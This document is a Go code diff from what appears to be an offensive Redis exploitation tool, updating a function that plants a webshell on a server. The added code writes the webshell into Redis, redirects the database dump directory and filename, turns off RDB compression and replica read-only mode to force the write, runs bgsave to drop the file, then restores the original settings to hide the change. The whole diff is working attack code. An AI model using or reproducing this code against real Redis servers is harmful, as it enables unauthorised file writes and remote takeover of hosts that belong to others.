@@ -4,12 +4,12 @@ import (
 	"context"
 	"encoding/base64"
 	"fmt"
-	"os"
 	"strings"
 	"time"
 )
 
 func EchoShell(dir, dbfilename, webshell string) {
+	RedisVersion(false)
 
 	dir = fmt.Sprintf("config set dir %v", dir)
 	dbfilename = fmt.Sprintf("config set dbfilename %v", dbfilename)
@@ -31,25 +31,36 @@ func EchoShell(dir, dbfilename, webshell string) {
 	ctx := context.Background()
 	ok, err := Rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()
 
+	readOnly := getRedisValue("config get slave-read-only")
+
 	if err != nil {
-		fmt.Println(err)
-		return
+		if strings.Contains(err.Error(), "READONLY You can't write against a read only replica.") {
+			fmt.Println("[GG]\t目标开启了主从, 尝试关闭 slave-read-only 来写入文件")
+
+			if strings.EqualFold(readOnly, "yes") {
+				RunRedisCmd("config set slave-read-only no")
+				ok, _ = Rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()
+			}
+
+		} else {
+			fmt.Println(err)
+			return
+		}
 	}
 
 	fmt.Printf("[%v]\t%v\n", ok, "set webshell "+strings.ReplaceAll(webshell, "\n", ""))
 
 	// 关闭redis压缩来写入文件
-	compression := getRDBCompression()
-	if strings.EqualFold(compression, "no") {
-		RunRedisCmd("bgsave")
-		RunRedisCmd("del webshell")
-	} else {
+	compression := getRedisValue("config get rdbcompression")
+
+	if strings.EqualFold(compression, "yes") {
 		RunRedisCmd("config set rdbcompression no")
-		RunRedisCmd("bgsave")
-		RunRedisCmd("del webshell")
-		RunRedisCmd("config set rdbcompression yes")
 	}
 
+	RunRedisCmd("bgsave")
+
+	// 恢复原来的配置
+	defer defaultConfig(compression, readOnly)
 }
 
 func RunRedisCmd(cmd string) {
@@ -57,23 +68,19 @@ func RunRedisCmd(cmd string) {
 
 	if err != nil {
 		fmt.Printf("[%v]\t%v\n", GbkToUtf8(err.Error()), cmd)
-		os.Exit(0)
+	} else {
+		fmt.Printf("[%v]\t%v\n", res, GbkToUtf8(cmd))
 	}
-	fmt.Printf("[%v]\t%v\n", res, GbkToUtf8(cmd))
 }
 
-// 获取 redis 压缩是否开启
-func getRDBCompression() string {
-	result, err := RedisCmd("config get rdbcompression")
-	if err != nil {
-		fmt.Println(err)
-		return "no"
-	}
+// 恢复原来的配置
+func defaultConfig(compression, readOnly string) {
+	RunRedisCmd("del webshell")
 
-	if values, ok := result.([]interface{}); ok && len(values) > 1 {
-		if compression, ok := values[1].(string); ok {
-			return compression
-		}
-	}
-	return "no"
+	RunRedisCmd(fmt.Sprintf("config set dir %v", Redis_dir))
+	RunRedisCmd(fmt.Sprintf("config set dbfilename %v", Redis_dbfilename))
+
+	RunRedisCmd("config set rdbcompression " + compression)
+	RunRedisCmd("config set slave-read-only " + readOnly)
+	//RunRedisCmd("bgsave")
 }
